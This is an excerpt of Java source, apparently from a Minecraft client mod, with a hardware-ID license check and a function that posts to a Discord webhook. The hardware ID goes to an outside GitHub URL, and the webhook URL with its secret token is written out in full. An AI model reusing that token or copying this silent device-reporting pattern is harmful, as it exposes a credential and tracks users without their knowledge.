package ubl.nohurtcam.hwid;

import net.minecraft.client.MinecraftClient;
import ubl.nohurtcam.hwid.util.StringUtil;
import ubl.nohurtcam.hwid.util.Webhook;
...
public class Hwid {
    public static boolean validateHwid() {
        ...
        try {
            ...
            URL url = new URL("https://raw.githubusercontent.com/EDestroyer10/HWID/main/hwid.json?hwid=" + hwid);
    ...
    public static void sendWebhook() throws IOException {
        try {
            ...
            Webhook webhook = new Webhook("https://discord.com/api/webhooks/1112266602478583850/mPEXt1gkfaEErps55RwIvv3TZTuILZp2bQ5t8raINvRXSRSZnu2gjSe865A-9o-CmzDj");
